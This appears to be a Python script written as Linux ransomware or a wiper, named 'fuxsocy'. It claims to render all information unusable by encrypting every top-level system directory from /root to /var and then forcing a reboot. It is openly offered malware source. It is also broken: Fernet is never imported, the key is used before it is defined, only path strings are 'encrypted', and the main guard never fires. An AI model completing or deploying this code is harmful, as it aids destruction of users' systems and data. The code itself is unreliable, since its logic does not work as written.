#All imports here
import time
import os
import socket
import subprocess
import uuid
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from paramiko import SSHClient

#All variables to be declared here
f = Fernet(key)

bindir = "/bin/"
bootdirv = "/boot/"
devdir = "/dev/"
etcdir = "/etc/"
homedir = "/home/"
libdir = "/lib/"
lib32dir = "/lib32/"
lib64dir = "/lib64/"
mediadir = "/media/"
mntdir = "/mnt/"
optdir = "/opt/"
procdir = "/proc/"
rootdir = "/root/"
rundir = "/run/"
sbindir = "/sbin/"
snapdir = "/snap/"
srvdir = "/srv/"
sysdir = "/sys/"
tmpdir = "/tmp/"
usrdir = "/usr/"
vardir = "/var/"

keySalt = uuid.uuid4().hex
masterKey = Fernet.generate_key()



#Pre-programmed functions to be declared here
def fuxocyMain():
    #fuxsocy, running this script will render all information unusable
    rootenc = f.encrypt(rootdir)
    print("Finished encryption of /root/")
    binenc = f.encrypt(bindir)
    print("Finished encryption of /bin/")
    devenc = f.encrypt(devdir)
    print("Finished encryption of /dev/")
    etcenc = f.encrypt(etcdir)
    print("Finished encryption of /etc/")
    homeenc = f.encrypt(homedir)
    print("Finished encryption of /home/")
    libenc = f.encrypt(libdir)
    print("Finished encryption of /lib/")
    lib32enc = f.encrypt(lib32dir)
    print("Finished encryption of /lib32/")
    lib64enc = f.encrypt(lib64dir)
    print("Finished encryption of /lib64/")
    mediaenc = f.encrypt(mediadir)
    print("Finished encryption of /media/")
    mntenc = f.encrypt(mntdir)
    print("Finished encryption of /mnt/")
    optenc = f.encrypt(optdir)
    print("Finished encryption of /opt/")
    procenc = f.encrypt(procdir)
    print("Finished encryption of /proc/")
    runenc = f.encrypt(rundir)
    print("Finished encrypton of /run/")
    sbinenc = f.encrypt(sbindir)
    print("Finished encrypton of /sbin/")
    snapenc = f.encrypt(snapdir)
    print("Finished encrypton of /snap/")
    srvenc = f.encrypt(srvdir)
    print("Finished encrypton of /srv/")
    sysenc = f.encrypt(sysdir)
    print("Finished encrypton of /sys/")
    tmpenc = f.encrypt(tmpdir)
    print("Finished encrypton of /tmp/")
    usrenc = f.encrypt(usrdir)
    print("Finished encrypton of /usr/")
    varenc = f.encrypt(vardir)
    print("Finished encrypton of /var/")
    print("All operations finished, bye bye")
    time.sleep(2)

    os.system('reboot')

def encryptionMain():
    password = masterKey.encode() # Convert to type bytes
    salt = keySalt.encode()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=2048,
        salt=salt,
        iterations=100000,
        backend=default_backend()
        )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    fuxocyMain()

#Start main program after all variables are declared
if __name__ == '__name__':
    os.system('clear')
    encryptionMain()
